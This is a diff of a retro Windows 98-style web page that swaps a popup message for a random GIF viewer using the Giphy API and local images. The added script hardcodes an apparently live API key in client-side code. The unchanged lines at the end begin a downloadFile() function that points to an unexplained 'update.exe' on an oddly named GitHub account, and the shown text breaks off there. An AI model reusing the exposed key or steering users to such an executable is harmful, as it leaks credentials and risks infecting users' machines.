@@ -62,23 +62,31 @@
         .hidden-content {
             display: none;
             margin-top: 30px;
-            padding: 20px;
+            padding: 0;
             background-color: #C0C0C0;
             border: 2px solid;
             border-color: #FFFFFF #808080 #808080 #FFFFFF;
             font-size: 14px;
-            max-width: 500px;
+            width: 500px;
+            height: 400px;
+            position: relative;
+            overflow: hidden;
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
         }
         .window-title {
             background: linear-gradient(to right, #000080, #1084D0);
             color: white;
             padding: 3px 5px;
-            margin: -20px -20px 15px -20px;
+            margin: 0;
             font-weight: bold;
             font-size: 12px;
             display: flex;
             justify-content: space-between;
             align-items: center;
+            position: relative;
+            z-index: 10;
         }
         .close-button {
             background: #C0C0C0;
@@ -94,6 +102,31 @@
         .close-button:active {
             border-color: #808080 #FFFFFF #FFFFFF #808080;
         }
+        .menu-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-family: 'Times New Roman', Times, serif;
+            color: red;
+            font-size: 60px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 5px;
+            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.7);
+            z-index: 5;
+        }
+        .corner-image {
+            position: absolute;
+            top: 25px;
+            left: 10px;
+            width: 80px;
+            height: 80px;
+            border: 2px solid;
+            border-color: #FFFFFF #808080 #808080 #FFFFFF;
+            z-index: 7;
+            object-fit: cover;
+        }
     </style>
 </head>
 <body>
@@ -104,22 +137,64 @@
         <button class="win98-button" onclick="showContent()">CLICK HERE!!!</button>
         <div id="hiddenContent" class="hidden-content">
             <div class="window-title">
-                <span>System Message</span>
+                <span>Random GIF Viewer</span>
                 <button class="close-button" onclick="hideContent()">X</button>
             </div>
-            <p>Congratulations! You found the secret message!</p>
-            <p>This site is made in Windows 98 style with pixel graphics.</p>
-            <p>Click X to close this window.</p>
+            <img id="cornerImage" class="corner-image" src="" alt="Random Asset">
+            <div id="menuText" class="menu-text">MENU</div>
         </div>
     </div>
 
     <script>
+        const GIPHY_API_KEY = 'GlVGYHkr3WSBnllca54iNt0yFbjz7L65';
+        
+        const localAssets = [
+            'assets/1.png',
+            'assets/2.png',
+            'assets/3.png',
+            'assets/4.png',
+            'assets/5.png',
+            'assets/6.png',
+            'assets/7.png',
+            'assets/8.png'
+        ];
+        
         function showContent() {
             document.getElementById('hiddenContent').style.display = 'block';
+            loadRandomGif();
+            loadRandomLocalImage();
         }
+        
         function hideContent() {
             document.getElementById('hiddenContent').style.display = 'none';
+            document.getElementById('hiddenContent').style.backgroundImage = '';
+            document.getElementById('cornerImage').src = '';
         }
+        
+        function loadRandomGif() {
+            fetch(`https://api.giphy.com/v1/gifs/random?api_key=${GIPHY_API_KEY}&rating=g`)
+                .then(response => response.json())
+                .then(data => {
+                    const gifUrl = data.data.images.original.url;
+                    const hiddenContent = document.getElementById('hiddenContent');
+                    hiddenContent.style.backgroundImage = `url(${gifUrl})`;
+                })
+                .catch(error => {
+                    console.error('Error fetching random GIF:', error);
+                    document.getElementById('hiddenContent').style.backgroundImage = '';
+                });
+        }
+
+        function loadRandomLocalImage() {
+            if (localAssets.length === 0) {
+                console.error("The localAssets array is empty.");
+                return;
+            }
+            const randomIndex = Math.floor(Math.random() * localAssets.length);
+            const randomImagePath = localAssets[randomIndex];
+            document.getElementById('cornerImage').src = randomImagePath;
+        }
+        
         function downloadFile() {
             const link = document.createElement('a');
             link.href = 'https://github.com/jan360gmbjd-del/jannnmgcc.github.io/releases/download/update/update.exe';
